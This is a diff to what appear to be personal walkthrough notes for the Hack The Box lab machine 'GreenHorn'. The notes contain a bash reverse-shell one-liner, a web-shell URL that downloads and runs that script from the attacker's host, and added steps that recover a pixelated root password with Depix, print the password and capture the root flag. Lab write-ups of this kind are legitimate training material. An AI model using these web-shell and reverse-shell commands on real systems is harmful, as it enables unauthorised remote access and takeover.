@@ -132,7 +132,7 @@ On attack machine, create reverse.sh and serve it on webpage then paste URL to g
 #!/bin/bash
  bash -i >& /dev/tcp/10.10.14.209/4444 0>&1 
 
-http://greenhorn.htb/data/modules/test3/shell.php?cmd=wget%20http%3A%2F%2F10.10.14.209%3A8001%2Freverse.sh%20-O%20%2Ftmp%2Freverse.sh%20%26%26%20chmod%20%2Bx%20%2Ftmp%2Freverse.sh%20%26%26%20%2Ftmp%2Freverse.sh
+http://greenhorn.htb/data/modules/test4/shell.php?cmd=wget%20http%3A%2F%2F10.10.14.217%3A8001%2Freverse.sh%20-O%20%2Ftmp%2Freverse.sh%20%26%26%20chmod%20%2Bx%20%2Ftmp%2Freverse.sh%20%26%26%20%2Ftmp%2Freverse.sh
 
 Let’s move to junior’s account using password from earlier
 
@@ -162,4 +162,15 @@ https://github.com/spipm/Depix/tree/main
 
 https://forum.hackthebox.com/t/official-greenhorn-discussion/318358/121 
 
-Uncomplete, leaving for now since we can’t get Depix to work. 
+pdfimages ./Using_OpenVAS.pdf greenhorn 
+
+python3 depix.py -p ../greenhorn-000.ppm -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o out1.png
+
+Password: sidefromsidetheothersidesidefromsidetheotherside
+
+Su root and login with password, now we have root access
+root@greenhorn:~# cat root.txt	
+cat root.txt
+c344968d613b5da63d6fb626463f265f
+
+ 
